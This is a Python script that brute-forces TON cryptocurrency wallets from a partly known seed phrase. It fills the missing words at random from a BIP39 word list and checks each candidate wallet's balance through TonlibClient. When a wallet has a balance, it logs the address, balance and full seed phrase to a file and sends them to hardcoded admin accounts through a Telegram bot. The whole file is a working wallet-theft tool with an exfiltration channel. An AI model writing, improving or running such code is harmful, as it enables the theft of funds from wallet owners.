import asyncio
# import multiprocessing
import logging
import os
import random

from ton import TonlibClient

from aiogram import Bot
from aiogram.dispatcher import Dispatcher

from dotenv import load_dotenv

load_dotenv()  # take environment variables from .env.

TOKEN = str(os.environ.get("API_TOKEN"))

logging.basicConfig(filename='ton_logs.log', filemode='w',
                    format=u'%(filename)s [LINE:%(lineno)d] #%(levelname)-8s [%(asctime)s]  %(message)s',
                    # level=logging.INFO,
                    level=logging.DEBUG,
                    )

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

ADMINS = [
    6405640,
    # 118218714,
]


def dictionary(file):
    d = {}
    for i, line in enumerate(open(file, 'r')):
        line = line.strip()
        a = line
        d[i] = a
    return d


async def check_address_in_network(seed, client):
    wallet = await client.import_wallet(' '.join(x for x in seed))
    balance = await wallet.get_balance()
    if balance != -1:
        f = open("Finder.txt", "a")
        f.write('ADDReSS: ' + str(wallet.account_address.account_address))
        f.write('Balance: ' + str(balance))
        f.write('\nSEED: ' + str(' '.join(x for x in seed)))
        f.write('\n------------------------\n')
        f.close()
        for admin in ADMINS:
            try:
                await dp.bot.send_message(chat_id=admin,
                                          text=f'Нашел\n'
                                               f'Address: {str(wallet.account_address.account_address)}\n'
                                               f'Balance: {str(balance)}\n'
                                               f'Seed: {str(" ".join(x for x in seed))}')
            except Exception:
                pass


async def new_ton_lib():
    print('Start')
    for admin in ADMINS:
        try:
            await dp.bot.send_message(chat_id=admin, text="Скрипт запущен Гриша лох!!!!!")
        except Exception:
            pass
    client = TonlibClient()
    client.enable_unaudited_binaries()
    # await client.init_tonlib()

    d = dictionary('english.txt')

    # while seed is 'blast cave virus nation roof notice walnut circle stadium december defy execute game wear helmet':
    while True:
        seed = 'blast cave virus nation roof notice walnut round stadium december defy execute game wear helmet'

        seed = seed.split(' ')
        while len(seed) != 24:
            word = d[random.randint(0, 2047)]
            seed.append(word)
        try:
            await check_address_in_network(seed, client)
        except:
            pass
        try:
            seed[7] = 'range'
            await check_address_in_network(seed, client)
        except:
            pass
        try:
            seed[12] = 'play'
            await check_address_in_network(seed, client)
        except:
            pass
        try:
            seed[7] = 'round'
            await check_address_in_network(seed, client)
        except:
            pass


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(new_ton_lib())

# if __name__ == '__main__':
#
#     for cpu in range(multiprocessing.cpu_count()):
#         loop = asyncio.get_event_loop()
#         print('start')
#         loop.run_until_complete(new_ton_lib())
#         # multiprocessing.Process(target=new_ton_lib).start()
